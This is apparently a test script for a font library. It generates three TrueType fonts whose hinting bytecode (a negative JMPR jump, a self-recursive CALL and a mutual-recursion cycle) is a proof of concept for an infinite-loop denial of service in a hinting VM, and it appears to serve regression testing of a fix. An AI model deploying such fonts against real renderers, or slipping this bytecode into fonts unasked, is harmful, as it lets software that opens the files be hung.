/**
 * Generates minimal TrueType fonts with crafted hinting instructions that
 * trigger denial-of-service vectors in the hinting VM.
 *
 * This is a proof-of-concept for CVE: TrueType Hinting VM Infinite Loop (CWE-834).
 *
 * Three fonts are generated:
 *   1. HintingJMPRLoop.ttf   - JMPR with negative offset creates infinite backward jump
 *   2. HintingRecursiveCALL.ttf - Function that CALLs itself, causing infinite recursion
 *   3. HintingMutualRecursion.ttf - Two functions that CALL each other in a cycle
 *
 * Usage: node test/generate-hinting-dos-fonts.mjs
 * Output: test/fonts/HintingJMPRLoop.ttf
 *         test/fonts/HintingRecursiveCALL.ttf
 *         test/fonts/HintingMutualRecursion.ttf
 */

import { writeFileSync } from 'fs';
import { dirname, join } from 'path';
import { fileURLToPath } from 'url';
import {
    u16,
    makeHead, makeHhea, makeMaxp, makeOS2, makeName, makeHmtx, makeCmap, makePost,
    assembleFont,
} from './font-generation-helpers.mjs';

const __dirname = dirname(fileURLToPath(import.meta.url));

function buildFont(familyName, fpgmInstructions) {
    return assembleFont({
        'head': makeHead(),
        'hhea': makeHhea(1),
        'maxp': makeMaxp(1, { maxFunctionDefs: 16, maxStorage: 16, maxStackElements: 64 }),
        'OS/2': makeOS2(),
        'name': makeName(familyName),
        'cmap': makeCmap(),     // no character mappings needed
        'post': makePost(),
        'loca': [...u16(0), ...u16(0)],  // short format, 1 empty glyph
        'glyf': [],
        'hmtx': makeHmtx(1),
        'fpgm': [...fpgmInstructions],
    });
}

// --- POC font definitions ---

// 1. JMPR with negative offset: infinite backward jump
//    PUSHW[0] -3, JMPR  →  ip jumps back to byte 0 each iteration
const jmprLoopFpgm = [
    0xB8,       // PUSHW[0] (push one 16-bit value)
    0xFF, 0xFD, // -3 as signed 16-bit
    0x1C,       // JMPR
];

// 2. Recursive CALL: function 0 calls itself
//    FDEF 0 { CALL 0 } ENDF; CALL 0
const recursiveCallFpgm = [
    0xB0, 0x00, // PUSHB[0] 0
    0x2C,       // FDEF
    0xB0, 0x00, // PUSHB[0] 0
    0x2B,       // CALL (self-recursion)
    0x2D,       // ENDF
    0xB0, 0x00, // PUSHB[0] 0
    0x2B,       // CALL
];

// 3. Mutual recursion: function 0 calls function 1, function 1 calls function 0
const mutualRecursionFpgm = [
    // FDEF 0: CALL 1
    0xB0, 0x00, // PUSHB[0] 0
    0x2C,       // FDEF
    0xB0, 0x01, // PUSHB[0] 1
    0x2B,       // CALL
    0x2D,       // ENDF
    // FDEF 1: CALL 0
    0xB0, 0x01, // PUSHB[0] 1
    0x2C,       // FDEF
    0xB0, 0x00, // PUSHB[0] 0
    0x2B,       // CALL
    0x2D,       // ENDF
    // trigger
    0xB0, 0x00, // PUSHB[0] 0
    0x2B,       // CALL
];

// --- generate ---

const fonts = [
    { name: 'HintingJMPRLoop', fpgm: jmprLoopFpgm },
    { name: 'HintingRecursiveCALL', fpgm: recursiveCallFpgm },
    { name: 'HintingMutualRecursion', fpgm: mutualRecursionFpgm },
];

for (const { name, fpgm } of fonts) {
    const bytes = buildFont(name, fpgm);
    const outPath = join(__dirname, 'fonts', name + '.ttf');
    writeFileSync(outPath, bytes);
    console.log(`Written ${bytes.length} bytes to ${outPath}`);
}
